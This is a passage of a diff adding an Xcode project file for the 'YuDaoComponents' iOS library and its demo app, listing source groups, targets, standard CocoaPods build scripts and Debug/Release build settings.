+				3BC6BA1D210E0D6900C038BF /* HttpResponse.swift */,
+				3BC6BA1F210E0D7B00C038BF /* HttpResponseModel.swift */,
+			);
+			path = Http;
+			sourceTree = "<group>";
+		};
+		3BD76776213CDC3F00462321 /* WebView */ = {
+			isa = PBXGroup;
+			children = (
+				3BD76764213CD9DD00462321 /* common_btn_nav_back@2x.png */,
+				3BD76778213CFF7A00462321 /* TestWebViewVC.swift */,
+			);
+			path = WebView;
+			sourceTree = "<group>";
+		};
+		3BE56CA621830B5000C168D7 /* ButtonFlow */ = {
+			isa = PBXGroup;
+			children = (
+				3BE56CA721830B8200C168D7 /* ButtonFlow.swift */,
+			);
+			path = ButtonFlow;
+			sourceTree = "<group>";
+		};
+		3BE56CA921842FB300C168D7 /* ButtonFlow */ = {
+			isa = PBXGroup;
+			children = (
+				3BE56CAA21842FC300C168D7 /* ButtonFlowVC.swift */,
+			);
+			path = ButtonFlow;
+			sourceTree = "<group>";
+		};
+		3BEA29A021D1DA9400D45356 /* MVVM */ = {
+			isa = PBXGroup;
+			children = (
+				3BEA29A121D1FAD500D45356 /* MvvmDemoVC.swift */,
+			);
+			path = MVVM;
+			sourceTree = "<group>";
+		};
+		56F0D00B35D5892A720BE6D7 /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				C8DD70D9DB56D4A513ACC3FE /* Pods-YuDaoComponents.debug.xcconfig */,
+				03E0EA72839F50FF975D3550 /* Pods-YuDaoComponents.release.xcconfig */,
+				16B53BAFC930CD74981BB7FD /* Pods-YuDaoComponentsDemo.debug.xcconfig */,
+				ED60A1F9F2FBE1E2010F3B1D /* Pods-YuDaoComponentsDemo.release.xcconfig */,
+			);
+			name = Pods;
+			sourceTree = "<group>";
+		};
+		89176D331A3EDDD435329410 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				06C52301F42C5CEC64B5E6EA /* Pods_YuDaoComponents.framework */,
+				10A6A4908FE997951ABD0D4D /* Pods_YuDaoComponentsDemo.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXHeadersBuildPhase section */
+		3B2B04BA210805640067347E /* Headers */ = {
+			isa = PBXHeadersBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				3B2B04CE210805650067347E /* YuDaoComponents.h in Headers */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXHeadersBuildPhase section */
+
+/* Begin PBXNativeTarget section */
+		3B2B04BC210805640067347E /* YuDaoComponents */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 3B2B04D1210805650067347E /* Build configuration list for PBXNativeTarget "YuDaoComponents" */;
+			buildPhases = (
+				6321707B691228F79173E463 /* [CP] Check Pods Manifest.lock */,
+				3B2B04B8210805640067347E /* Sources */,
+				3B2B04B9210805640067347E /* Frameworks */,
+				3B2B04BA210805640067347E /* Headers */,
+				3B2B04BB210805640067347E /* Resources */,
+			);
+			buildRules = (
+				85E9C9B13A6774820B6D902C /* PBXBuildRule */,
+			);
+			dependencies = (
+			);
+			name = YuDaoComponents;
+			productName = YuDaoComponents;
+			productReference = 3B2B04BD210805640067347E /* YuDaoComponents.framework */;
+			productType = "com.apple.product-type.framework";
+		};
+		3B2B04C5210805640067347E /* YuDaoComponentsTests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 3B2B04D4210805650067347E /* Build configuration list for PBXNativeTarget "YuDaoComponentsTests" */;
+			buildPhases = (
+				3B2B04C2210805640067347E /* Sources */,
+				3B2B04C3210805640067347E /* Frameworks */,
+				3B2B04C4210805640067347E /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				3B2B04C9210805640067347E /* PBXTargetDependency */,
+			);
+			name = YuDaoComponentsTests;
+			productName = YuDaoComponentsTests;
+			productReference = 3B2B04C6210805640067347E /* YuDaoComponentsTests.xctest */;
+			productType = "com.apple.product-type.bundle.unit-test";
+		};
+		3B2B04DA210807090067347E /* YuDaoComponentsDemo */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 3B2B04EA2108070A0067347E /* Build configuration list for PBXNativeTarget "YuDaoComponentsDemo" */;
+			buildPhases = (
+				31A33E36220B9185716D1668 /* [CP] Check Pods Manifest.lock */,
+				3B2B04D7210807090067347E /* Sources */,
+				3B2B04D8210807090067347E /* Frameworks */,
+				3B2B04D9210807090067347E /* Resources */,
+				30FA0FC79A0886CB7546EB68 /* [CP] Embed Pods Frameworks */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = YuDaoComponentsDemo;
+			productName = YuDaoComponentsDemo;
+			productReference = 3B2B04DB210807090067347E /* YuDaoComponentsDemo.app */;
+			productType = "com.apple.product-type.application";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		3B2B04B4210805640067347E /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				LastSwiftUpdateCheck = 0940;
+				LastUpgradeCheck = 0940;
+				ORGANIZATIONNAME = "Jiangsu Yu Dao Data Technology Co.,Ltd";
+				TargetAttributes = {
+					3B2B04BC210805640067347E = {
+						CreatedOnToolsVersion = 9.4.1;
+						LastSwiftMigration = 0940;
+					};
+					3B2B04C5210805640067347E = {
+						CreatedOnToolsVersion = 9.4.1;
+					};
+					3B2B04DA210807090067347E = {
+						CreatedOnToolsVersion = 9.4.1;
+					};
+				};
+			};
+			buildConfigurationList = 3B2B04B7210805640067347E /* Build configuration list for PBXProject "YuDaoComponents" */;
+			compatibilityVersion = "Xcode 9.3";
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+				"zh-Hans",
+			);
+			mainGroup = 3B2B04B3210805640067347E;
+			productRefGroup = 3B2B04BE210805640067347E /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				3B2B04BC210805640067347E /* YuDaoComponents */,
+				3B2B04C5210805640067347E /* YuDaoComponentsTests */,
+				3B2B04DA210807090067347E /* YuDaoComponentsDemo */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXResourcesBuildPhase section */
+		3B2B04BB210805640067347E /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		3B2B04C4210805640067347E /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		3B2B04D9210807090067347E /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				3B2B04E82108070A0067347E /* LaunchScreen.storyboard in Resources */,
+				3B2B04E52108070A0067347E /* Assets.xcassets in Resources */,
+				3B2B04E3210807090067347E /* Main.storyboard in Resources */,
+				3BD76777213CFF6C00462321 /* common_btn_nav_back@2x.png in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+		30FA0FC79A0886CB7546EB68 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-YuDaoComponentsDemo/Pods-YuDaoComponentsDemo-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-YuDaoComponentsDemo/Pods-YuDaoComponentsDemo-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-YuDaoComponentsDemo/Pods-YuDaoComponentsDemo-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		31A33E36220B9185716D1668 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-YuDaoComponentsDemo-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		6321707B691228F79173E463 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-YuDaoComponents-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		3B2B04B8210805640067347E /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				3BA43DB621096CF10063B763 /* BaseViewController.swift in Sources */,
+				3B17AF1121883EB50027B896 /* Double+yd.swift in Sources */,
+				3B26BAA52150A597006FEE22 /* RefreshEmptyView.swift in Sources */,
+				3BD1FDF0211148B90094E99F /* UILabel+yd.swift in Sources */,
+				3BA43DB721096CF10063B763 /* BaseSectionView.swift in Sources */,
+				3BC6BA1A210E0D4300C038BF /* HttpRequest.swift in Sources */,
+				3BA43DAF21096CED0063B763 /* RouterDefines.swift in Sources */,
+				1BE0BBFF2148A852001507BA /* CalendarCell.swift in Sources */,
+				3BC86B90210EB8F100904954 /* UIViewController+yd.swift in Sources */,
+				3B2B0523210817550067347E /* UIColor+yd.swift in Sources */,
+				3B26BAA0214B5C1D006FEE22 /* CalendarView.swift in Sources */,
+				3B2B051D210816B60067347E /* Array+yd.swift in Sources */,
+				3BD76756213CCA1000462321 /* BaseWebViewController.swift in Sources */,
+				3B2B0517210815310067347E /* RxSwift+yd.swift in Sources */,
+				3B2B0527210817980067347E /* UIView+yd.swift in Sources */,
+				3BC6BA20210E0D7B00C038BF /* HttpResponseModel.swift in Sources */,
+				3B2B0521210817350067347E /* Data+yd.swift in Sources */,
+				3B419E042109A24D0065079F /* Tools.swift in Sources */,
+				3B4FDC4421ACE9FE00DB82FA /* Date+yd.swift in Sources */,
+				3B2B051B210816850067347E /* String+yd.swift in Sources */,
+				3B2B0525210817780067347E /* UIImage+yd.swift in Sources */,
+				1BCA8AE621489F090037AFC1 /* CalendarController.swift in Sources */,
+				3BC6BA1E210E0D6900C038BF /* HttpResponse.swift in Sources */,
+				3BE56CA821830B8200C168D7 /* ButtonFlow.swift in Sources */,
+				3BA43DB921096CF10063B763 /* BaseTableViewController.swift in Sources */,
+				3B2B0519210816340067347E /* Int+yd.swift in Sources */,
+				3B2B051F2108171B0067347E /* Dictionary+yd.swift in Sources */,
+				3BA43DB021096CED0063B763 /* RouterManager.swift in Sources */,
+				3BC6BA1C210E0D6000C038BF /* HttpRequestSender.swift in Sources */,
+				3BA43DB821096CF10063B763 /* BaseTableViewCell.swift in Sources */,
+				3B2B0515210813D30067347E /* YuDaoExtesionable.swift in Sources */,
+				3BC6BA18210E0D2900C038BF /* HttpRequestParam.swift in Sources */,
+				3B26BAA2214B5D3E006FEE22 /* CalenderViewPicker.swift in Sources */,
+				3B2BA2A8211A761500391656 /* CountDownButton.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		3B2B04C2210805640067347E /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				3B2B04CC210805650067347E /* YuDaoComponentsTests.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		3B2B04D7210807090067347E /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				3BEA29A221D1FAD500D45356 /* MvvmDemoVC.swift in Sources */,
+				1BE0BC022148A946001507BA /* CalendarViewController.swift in Sources */,
+				3BD76779213CFF7A00462321 /* TestWebViewVC.swift in Sources */,
+				3B2BA2AB211A80EA00391656 /* CountDownButtonVC.swift in Sources */,
+				3BE56CAB21842FC300C168D7 /* ButtonFlowVC.swift in Sources */,
+				3B2B04E0210807090067347E /* ViewController.swift in Sources */,
+				3B2B04DE210807090067347E /* AppDelegate.swift in Sources */,
+				1B4D607E214A0BAE00E00013 /* NoDataViewController.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		3B2B04C9210805640067347E /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 3B2B04BC210805640067347E /* YuDaoComponents */;
+			targetProxy = 3B2B04C8210805640067347E /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
+
+/* Begin PBXVariantGroup section */
+		3B2B04E1210807090067347E /* Main.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				3B2B04E2210807090067347E /* Base */,
+				3B26BA9D214B55EE006FEE22 /* zh-Hans */,
+			);
+			name = Main.storyboard;
+			sourceTree = "<group>";
+		};
+		3B2B04E62108070A0067347E /* LaunchScreen.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				3B2B04E72108070A0067347E /* Base */,
+				3B26BA9E214B55EE006FEE22 /* zh-Hans */,
+			);
+			name = LaunchScreen.storyboard;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
+/* Begin XCBuildConfiguration section */
+		3B2B04CF210805650067347E /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				CODE_SIGN_IDENTITY = "iPhone Developer";
+				COPY_PHASE_STRIP = NO;
+				CURRENT_PROJECT_VERSION = 1;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.4;
+				MTL_ENABLE_DEBUG_INFO = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
+				SWIFT_OBJC_BRIDGING_HEADER = "";
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+				VERSIONING_SYSTEM = "apple-generic";
+				VERSION_INFO_PREFIX = "";
+			};
+			name = Debug;
+		};
+		3B2B04D0210805650067347E /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				CODE_SIGN_IDENTITY = "iPhone Developer";
+				COPY_PHASE_STRIP = NO;
+				CURRENT_PROJECT_VERSION = 1;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.4;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				SDKROOT = iphoneos;
+				SWIFT_COMPILATION_MODE = wholemodule;
+				SWIFT_OBJC_BRIDGING_HEADER = "";
+				SWIFT_OPTIMIZATION_LEVEL = "-O";
+				VALIDATE_PRODUCT = YES;
+				VERSIONING_SYSTEM = "apple-generic";
+				VERSION_INFO_PREFIX = "";
+			};
+			name = Release;
+		};
+		3B2B04D2210805650067347E /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = C8DD70D9DB56D4A513ACC3FE /* Pods-YuDaoComponents.debug.xcconfig */;
+			buildSettings = {
+				CLANG_ENABLE_MODULES = YES;
+				CODE_SIGN_IDENTITY = "";
+				CODE_SIGN_STYLE = Automatic;
+				DEFINES_MODULE = YES;
+				DYLIB_COMPATIBILITY_VERSION = 1;
+				DYLIB_CURRENT_VERSION = 1;
+				DYLIB_INSTALL_NAME_BASE = "@rpath";
+				INFOPLIST_FILE = YuDaoComponents/Info.plist;
+				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
+				IPHONEOS_DEPLOYMENT_TARGET = 9.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				MACH_O_TYPE = staticlib;
+				PRODUCT_BUNDLE_IDENTIFIER = com.YuDaoData.YuDaoComponents;
+				PRODUCT_NAME = "$(TARGET_NAME:c99extidentifier)";
+				SKIP_INSTALL = YES;
+				SWIFT_OBJC_BRIDGING_HEADER = "";
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+				SWIFT_VERSION = 4.2;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Debug;
+		};
+		3B2B04D3210805650067347E /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 03E0EA72839F50FF975D3550 /* Pods-YuDaoComponents.release.xcconfig */;
+			buildSettings = {
+				CLANG_ENABLE_MODULES = YES;
+				CODE_SIGN_IDENTITY = "";
+				CODE_SIGN_STYLE = Automatic;
+				DEFINES_MODULE = YES;
+				DYLIB_COMPATIBILITY_VERSION = 1;
+				DYLIB_CURRENT_VERSION = 1;
+				DYLIB_INSTALL_NAME_BASE = "@rpath";
+				INFOPLIST_FILE = YuDaoComponents/Info.plist;
+				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
+				IPHONEOS_DEPLOYMENT_TARGET = 9.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				MACH_O_TYPE = staticlib;
+				PRODUCT_BUNDLE_IDENTIFIER = com.YuDaoData.YuDaoComponents;
+				PRODUCT_NAME = "$(TARGET_NAME:c99extidentifier)";
+				SKIP_INSTALL = YES;
+				SWIFT_OBJC_BRIDGING_HEADER = "";
+				SWIFT_VERSION = 4.2;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Release;
+		};
+		3B2B04D5210805650067347E /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
+				CODE_SIGN_STYLE = Automatic;
+				INFOPLIST_FILE = YuDaoComponentsTests/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = com.YuDaoData.YuDaoComponentsTests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_OBJC_BRIDGING_HEADER = "";
+				SWIFT_VERSION = 4.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Debug;
+		};
+		3B2B04D6210805650067347E /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
+				CODE_SIGN_STYLE = Automatic;
+				INFOPLIST_FILE = YuDaoComponentsTests/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = com.YuDaoData.YuDaoComponentsTests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_OBJC_BRIDGING_HEADER = "";
+				SWIFT_VERSION = 4.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Release;
+		};
+		3B2B04EB2108070A0067347E /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 16B53BAFC930CD74981BB7FD /* Pods-YuDaoComponentsDemo.debug.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = P623LX8B28;
+				INFOPLIST_FILE = YuDaoComponentsDemo/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 9.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				OTHER_SWIFT_FLAGS = "$(inherited) \"-D\" \"COCOAPODS\" \"-D\" \"DEBUG\"";
+				PRODUCT_BUNDLE_IDENTIFIER = com.YuDaoData.YuDaoComponentsDemo;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_OBJC_BRIDGING_HEADER = "";
+				SWIFT_VERSION = 4.2;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Debug;
+		};
+		3B2B04EC2108070A0067347E /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = ED60A1F9F2FBE1E2010F3B1D /* Pods-YuDaoComponentsDemo.release.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = P623LX8B28;
+				INFOPLIST_FILE = YuDaoComponentsDemo/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 9.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				OTHER_SWIFT_FLAGS = "$(inherited) \"-D\" \"COCOAPODS\"";
+				PRODUCT_BUNDLE_IDENTIFIER = com.YuDaoData.YuDaoComponentsDemo;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_OBJC_BRIDGING_HEADER = "";
+				SWIFT_VERSION = 4.2;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		3B2B04B7210805640067347E /* Build configuration list for PBXProject "YuDaoComponents" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				3B2B04CF210805650067347E /* Debug */,
+				3B2B04D0210805650067347E /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		3B2B04D1210805650067347E /* Build configuration list for PBXNativeTarget "YuDaoComponents" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				3B2B04D2210805650067347E /* Debug */,
+				3B2B04D3210805650067347E /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		3B2B04D4210805650067347E /* Build configuration list for PBXNativeTarget "YuDaoComponentsTests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				3B2B04D5210805650067347E /* Debug */,
